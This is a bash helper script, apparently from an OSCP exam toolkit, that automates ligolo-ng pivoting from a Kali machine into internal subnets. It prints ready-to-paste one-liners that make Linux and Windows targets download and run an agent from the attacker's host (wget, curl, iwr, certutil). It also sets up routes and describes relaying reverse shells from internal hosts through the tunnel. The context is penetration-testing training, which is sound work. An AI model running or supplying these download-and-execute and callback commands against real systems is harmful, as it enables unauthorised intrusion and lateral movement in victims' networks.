#!/bin/bash
# --- self-locate kit root (survives moving the whole tree) ---
KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
# pivot.sh — ligolo-ng pivot helper for the OSCP exam AD set.
# Sets up the tun interface + proxy on Kali, prints paste-ready agent one-liners
# (Kali VPN IP auto-filled), and manages routes to the internal subnet. The agent
# binaries are already staged in serve/ — run ./serve.sh in another pane so the
# target can pull them. This script handles the Kali side; you drop the agent.
#
# Usage:
#   pivot.sh up [proxy-port]        bring up the 'ligolo' tun iface + start the proxy
#                                   console (interactive; default port 11601)
#   pivot.sh agent [proxy-port]     print the download + connect one-liners (Linux+Win)
#   pivot.sh route <subnet> [..]    route a subnet INTO the tunnel (e.g. 172.16.5.0/24)
#   pivot.sh unroute <subnet> [..]  remove a routed subnet
#   pivot.sh revshell [port]        print how to catch an internal reverse shell (443)
#   pivot.sh status                 show iface, routes, proxy state
#   pivot.sh down                   tear down routes + the tun interface
#
# Typical exam flow:
#   1) pane A:  ./serve.sh 7890                 # stage the agent for download
#   2) pane B:  ./pivot.sh up                   # iface up + proxy console opens
#   3) on the pivot host (from ./pivot.sh agent), run the agent -> it calls back
#   4) in the proxy console:  session  (pick the agent)  then  start
#   5) pane C:  ./pivot.sh route 172.16.5.0/24  # now the internal subnet is reachable
#   6) enumerate the internal hosts straight from Kali (nmap/nxc/etc — no proxychains)
#
# Reverse shells FROM the internal net: see  ./pivot.sh revshell
#
# Env:  LIGOLO_IFACE (default 'ligolo')   SERVE_PORT (default 7890, matches serve.sh)

set -o pipefail
IFACE="${LIGOLO_IFACE:-ligolo}"
SERVE_PORT="${SERVE_PORT:-7890}"
log(){ echo -e "\n\033[1;34m[*] $1\033[0m"; }
ok(){  echo -e "\033[1;32m[+] $1\033[0m"; }
err(){ echo -e "\033[1;31m[!] $1\033[0m"; }
usage(){ grep '^#' "$0" | sed 's/^# \{0,1\}//'; }

# --- auto-detect the VPN IP so the one-liners are paste-ready (same as serve.sh) ---
# The agent connects back to THIS address, so it must be the one the target can
# reach — tun0 (OSCP VPN) first, else the first global-scope address.
KALI="$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)"
if [ -z "$KALI" ]; then
  KALI="$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)"
  [ -n "$KALI" ] && err "tun0 not found — using $KALI (not the VPN?). Fix the IP in the one-liners if wrong."
fi
KALI="${KALI:-<KALI>}"

iface_up(){ ip link show "$IFACE" >/dev/null 2>&1; }

cmd="${1:-}"; shift 2>/dev/null

case "$cmd" in
  up)
    PORT="${1:-11601}"
    command -v ligolo-proxy >/dev/null || { err "ligolo-proxy not found on PATH. (apt install ligolo-ng)"; exit 1; }
    if ! iface_up; then
      log "Creating tun interface '$IFACE' (needs sudo)"
      sudo ip tuntap add user "$(whoami)" mode tun "$IFACE" || { err "could not create $IFACE"; exit 1; }
    fi
    sudo ip link set "$IFACE" up || { err "could not bring $IFACE up"; exit 1; }
    ok "interface '$IFACE' is up"
    echo "    After an agent connects:  session  ->  start   (in the console below)"
    echo "    Then route the subnet from another pane:  ./pivot.sh route <subnet>"
    echo "    Agent one-liners:  ./pivot.sh agent $PORT"
    log "Starting ligolo-proxy (-selfcert, listening :$PORT) — Ctrl-C/exit to quit"
    exec ligolo-proxy -selfcert -laddr "0.0.0.0:$PORT"
    ;;

  agent)
    PORT="${1:-11601}"
    echo "# Drop the ligolo agent on the pivot host, then select it in the proxy console."
    echo "# Make sure ./serve.sh $SERVE_PORT is running on Kali first (serves serve/)."
    echo
    echo "# --- Linux target ---"
    echo "wget http://$KALI:$SERVE_PORT/linux/ligolo-agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $KALI:$PORT -ignore-cert &"
    echo "  # curl variant:"
    echo "curl -s http://$KALI:$SERVE_PORT/linux/ligolo-agent -o /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $KALI:$PORT -ignore-cert &"
    echo
    echo "# --- Windows target (PowerShell) ---"
    echo "iwr http://$KALI:$SERVE_PORT/windows/ligolo-agent.exe -OutFile \$env:TEMP\\agent.exe; Start-Process \$env:TEMP\\agent.exe -ArgumentList '-connect $KALI:$PORT -ignore-cert'"
    echo "# --- Windows target (cmd) ---"
    echo "certutil -urlcache -f http://$KALI:$SERVE_PORT/windows/ligolo-agent.exe %TEMP%\\agent.exe && start /b %TEMP%\\agent.exe -connect $KALI:$PORT -ignore-cert"
    ;;

  route)
    [ -z "$1" ] && { err "give one or more subnets, e.g. ./pivot.sh route 172.16.5.0/24"; exit 1; }
    iface_up || { err "'$IFACE' is not up — run ./pivot.sh up first."; exit 1; }
    for net in "$@"; do
      sudo ip route replace "$net" dev "$IFACE" && ok "routed $net -> $IFACE"
    done
    echo "    Internal subnet now reachable from Kali directly (no proxychains needed)."
    ;;

  unroute)
    [ -z "$1" ] && { err "give one or more subnets to remove."; exit 1; }
    for net in "$@"; do
      sudo ip route del "$net" dev "$IFACE" 2>/dev/null && ok "removed route $net" || err "no such route $net"
    done
    ;;

  revshell)
    RPORT="${1:-443}"
    echo "# Catch a reverse shell FROM an internal host back to Kali through the tunnel."
    echo "# 1) In the ligolo proxy console (after 'session' + 'start'), add a listener on the AGENT:"
    echo "listener_add --addr 0.0.0.0:$RPORT --to 127.0.0.1:$RPORT --tcp"
    echo "# 2) On Kali, catch it locally:"
    echo "./listener.sh $RPORT"
    echo "# 3) Point the internal target's reverse shell at the PIVOT host's IP on port $RPORT"
    echo "#    (the agent forwards 0.0.0.0:$RPORT on the pivot -> 127.0.0.1:$RPORT on Kali)."
    ;;

  status)
    log "interface '$IFACE'"
    if iface_up; then ip -br addr show "$IFACE"; else echo "  (not up — ./pivot.sh up)"; fi
    log "routes via '$IFACE'"
    ip route show dev "$IFACE" 2>/dev/null | sed 's/^/  /' || true
    [ -z "$(ip route show dev "$IFACE" 2>/dev/null)" ] && echo "  (none — ./pivot.sh route <subnet>)"
    log "ligolo-proxy"
    if pgrep -x ligolo-proxy >/dev/null; then ok "running (pid $(pgrep -x ligolo-proxy | paste -sd, -))"; else echo "  (not running — ./pivot.sh up)"; fi
    ;;

  down)
    if iface_up; then
      log "removing routes on '$IFACE'"
      ip route show dev "$IFACE" 2>/dev/null | awk '{print $1}' | while read -r net; do
        [ -n "$net" ] && sudo ip route del "$net" dev "$IFACE" 2>/dev/null && echo "    - $net"
      done
      log "deleting interface '$IFACE'"
      sudo ip link set "$IFACE" down 2>/dev/null
      sudo ip tuntap del mode tun "$IFACE" && ok "'$IFACE' removed"
    else
      echo "  (interface '$IFACE' not present — nothing to do)"
    fi
    pgrep -x ligolo-proxy >/dev/null && err "ligolo-proxy still running — exit its console (or: pkill ligolo-proxy)"
    ;;

  ""|-h|--help|help) usage;;
  *) err "unknown command '$cmd'"; echo; usage; exit 1;;
esac
